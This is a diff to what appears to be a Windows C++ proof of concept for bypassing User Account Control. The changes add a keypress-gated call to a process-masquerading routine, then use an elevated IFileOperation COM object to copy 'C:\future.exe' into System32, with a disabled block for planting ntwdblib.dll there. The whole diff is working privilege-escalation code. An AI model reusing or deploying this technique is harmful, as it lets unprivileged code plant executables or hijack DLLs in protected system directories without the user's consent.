@@ -625,18 +625,28 @@ int _tmain(int argc, _TCHAR* argv[])
         exit(0);
     }
 
-    // supMasqueradeProcess();
+    bool bDo = false;
+
+
+    char ch = getchar();
+
+    bDo = ch-'0';
+
+    if (bDo)
+    {
+        supMasqueradeProcess();
+    }
 
     HMODULE hModule = NULL;
     IFileOperation* fileOperation = NULL;
-    LPCWSTR dllName = L"apache-activemq-5.15.15-bin.zip";
+    LPCWSTR dllName = L"future.exe";
 #if 0
     LPCWSTR dllName = L"ntwdblib.dll";
     LPCWSTR SourceFullPath = L"C:\\6\\ntwdblib.dll";
     LPCWSTR DestPath = L"C:\\windows\\System32";
 #endif // 0
 
-    LPCWSTR SourceFullPath = L"C:\\Users\\shimingming\\Downloads\\apache-activemq-5.15.15-bin.zip";
+    LPCWSTR SourceFullPath = L"C:\\future.exe";
     LPCWSTR DestPath = L"C:\\windows\\System32";
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (SUCCEEDED(hr)) {
@@ -670,6 +680,7 @@ int _tmain(int argc, _TCHAR* argv[])
         }
         CoUninitialize();
     }
-    getchar();
+
+    system("pause");
     return 0;
 }
